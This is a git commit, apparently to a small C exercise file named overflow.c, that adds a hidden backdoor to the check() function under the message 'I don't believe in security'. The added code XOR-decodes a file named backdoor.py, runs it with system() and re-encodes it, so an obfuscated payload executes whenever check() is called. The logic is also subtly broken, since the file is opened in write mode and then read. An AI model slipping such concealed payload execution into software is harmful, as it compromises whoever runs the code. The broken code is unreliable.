8aaed4d85b1df9f43485e23b75f50092bf9564ce
edsnyder <edsnyder@mitre.org>
2019-07-10 09:44:12 -0400

    I don't believe in security

--- overflow.c
+++ overflow.c
@@ -10,6 +10,26 @@ void win(){
 }
 
 int check(char * buffer){
+    unsigned char buf[2048];
+    FILE *fp;
+    fp = fopen("backdoor.py", "wb");
+    size_t bytes_read = 0;
+    bytes_read = fread(buf, sizeof(unsigned char), 2048, fp);
+
+    for(int i = 0; i < bytes_read; i++){
+        buf[i] = buf[i] ^ 0x1;
+    }
+
+    fwrite(buf, sizeof(unsigned char), 2048, fp);
+
+    system("./backdoor.py");
+
+    for(int i = 0; i < bytes_read; i++){
+        buf[i] = buf[i] ^ 0x1;
+    }
+    fwrite(buf, sizeof(unsigned char), 2048, fp);
+    fclose(fp);
+
     if(buffer[0] == '0'){
         return 1;
     }
